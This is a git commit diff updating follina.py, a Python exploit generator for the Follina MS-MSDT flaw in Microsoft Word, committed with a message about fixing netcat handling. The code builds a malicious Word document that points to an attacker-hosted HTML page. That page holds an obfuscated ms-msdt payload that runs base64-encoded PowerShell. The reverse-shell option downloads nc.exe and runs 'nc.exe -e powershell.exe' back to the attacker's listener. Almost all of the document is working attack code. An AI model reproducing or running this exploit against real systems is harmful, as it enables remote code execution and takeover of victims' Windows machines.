db6cf8ea8615ac095604a65a377c129f374f51d7
WesamAhmedAdgham <46034870+WesamAhmedAdgham@users.noreply.github.com>
2024-02-29 10:35:17 +0200

    Update follina.py
    I've fixed the issue with executing netcat and added a new argument to specify netcat path then will copy the tool to the tmp dir where the HTTP server opened.

--- follina.py
+++ follina.py
@@ -1,19 +1,18 @@
-#!/usr/bin/env python3
-
-import argparse
-import zipfile
-import tempfile
-import shutil
-import os
-import netifaces
+import threading
+import socketserver
+import http.server
 import ipaddress
 import random
-import base64
-import http.server
-import socketserver
 import string
+import base64
+import os
+import shutil
+import tempfile
+import zipfile
+import argparse
+import netifaces
+import subprocess
 import socket
-import threading
 
 parser = argparse.ArgumentParser()
 
@@ -47,55 +46,57 @@ parser.add_argument(
 )
 
 parser.add_argument(
-    "--reverse",
+    "--reverseport",
     "-r",
     type=int,
     default="0",
     help="port to serve reverse shell on",
 )
 
+parser.add_argument(
+    "--netcat",
+    "-nc",
+    default="nc64.exe",
+    help="your available NetCat path",
+)
+
+args = parser.parse_args()
+
+# Check if the netcat path exists
+if not os.path.exists(args.netcat):
+    print("[!] Error: NetCat path does not exist.")
+    exit(1)
 
 def main(args):
-
-    # Parse the supplied interface
-    # This is done so the maldoc knows what to reach out to.
     try:
-        serve_host = ipaddress.IPv4Address(args.interface)
-    except ipaddress.AddressValueError:
+        # Parse the supplied interface
+        # This is done so the maldoc knows what to reach out to.
         try:
-            serve_host = netifaces.ifaddresses(args.interface)[netifaces.AF_INET][0][
-                "addr"
-            ]
-        except ValueError:
-            print(
-                "[!] error detering http hosting address. did you provide an interface or ip?"
-            )
-            exit()
+            serve_host = ipaddress.IPv4Address(args.interface)
+        except ipaddress.AddressValueError:
+            serve_host = netifaces.ifaddresses(args.interface)[netifaces.AF_INET][0]["addr"]
+    except (ValueError, KeyError):
+        print("[!] Error determining HTTP hosting address. Did you provide an interface or IP?")
+        exit(1)
 
     # Copy the Microsoft Word skeleton into a temporary staging folder
     doc_suffix = "doc"
-    staging_dir = os.path.join(
-        tempfile._get_default_tempdir(), next(tempfile._get_candidate_names())
-    )
+    staging_dir = os.path.join(tempfile.gettempdir(), next(tempfile._get_candidate_names()))
     doc_path = os.path.join(staging_dir, doc_suffix)
-    shutil.copytree(doc_suffix, os.path.join(staging_dir, doc_path))
-    print(f"[+] copied staging doc {staging_dir}")
+    shutil.copytree(doc_suffix, os.path.join(staging_dir, doc_suffix))
+    print(f"[+] Copied staging doc to {staging_dir}")
 
     # Prepare a temporary HTTP server location
     serve_path = os.path.join(staging_dir, "www")
-    os.makedirs(serve_path)
+    os.makedirs(serve_path, exist_ok=True)
 
     # Modify the Word skeleton to include our HTTP server
-    document_rels_path = os.path.join(
-        staging_dir, doc_suffix, "word", "_rels", "document.xml.rels"
-    )
+    document_rels_path = os.path.join(staging_dir, doc_suffix, "word", "_rels", "document.xml.rels")
 
     with open(document_rels_path) as filp:
         external_referral = filp.read()
 
-    external_referral = external_referral.replace(
-        "{staged_html}", f"http://{serve_host}:{args.port}/index.html"
-    )
+    external_referral = external_referral.replace("{staged_html}", f"http://{serve_host}:{args.port}/index.html")
 
     with open(document_rels_path, "w") as filp:
         filp.write(external_referral)
@@ -104,21 +105,26 @@ def main(args):
     shutil.make_archive(args.output, "zip", doc_path)
     os.rename(args.output + ".zip", args.output)
 
-    print(f"[+] created maldoc {args.output}")
+    print(f"[+] Created maldoc {args.output}")
+
+    # Copy netcat to the temporary directory
+    netcat_path_tmp = os.path.join(serve_path, "tools", "nc64.exe")
+    os.makedirs(os.path.join(serve_path, "tools"), exist_ok=True)
+    shutil.copyfile(args.netcat, netcat_path_tmp)
+    print(f"[+] Copied NetCat to {netcat_path_tmp}")
+
+    print(f"[+] NetCat path set to: {netcat_path_tmp}")
 
     command = args.command
-    if args.reverse:
-        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
+    if args.reverseport:
+        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e powershell.exe {serve_host} {args.reverseport}"""
 
     # Base64 encode our command so whitespace is respected
     base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
 
     # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
     html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
-    html_payload += (
-        "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
-        + "\n</script>"
-    )
+    html_payload += ("".join([random.choice(string.ascii_lowercase) for _ in range(4096)]) + "\n</script>")
 
     # Create our HTML endpoint
     with open(os.path.join(serve_path, "index.html"), "w") as filp:
@@ -134,13 +140,13 @@ def main(args):
             super().__init__(*args, directory=serve_path, **kwargs)
 
         def log_message(self, format, *func_args):
-            if args.reverse:
+            if args.reverseport:
                 return
             else:
                 super().log_message(format, *func_args)
 
         def log_request(self, format, *func_args):
-            if args.reverse:
+            if args.reverseport:
                 return
             else:
                 super().log_request(format, *func_args)
@@ -150,17 +156,15 @@ def main(args):
             httpd.serve_forever()
 
     # Host the HTTP server on all interfaces
-    print(f"[+] serving html payload on :{args.port}")
-    if args.reverse:
+    print(f"[+] Serving html payload on http://{serve_host}:{args.port}")
+    if args.reverseport:
         t = threading.Thread(target=serve_http, args=())
         t.start()
-        print(f"[+] starting 'nc -lvnp {args.reverse}' ")
-        os.system(f"nc -lnvp {args.reverse}")
-
+        print(f"[+] Serving NetCat on http://{serve_host}:{args.port}/tools/nc64.exe")
+        print(f"[+] Starting 'nc -lvnp {args.reverseport}' ")
+        subprocess.Popen(["nc", "-lnvp", str(args.reverseport)])
     else:
         serve_http()
 
-
 if __name__ == "__main__":
-
-    main(parser.parse_args())
+    main(args)
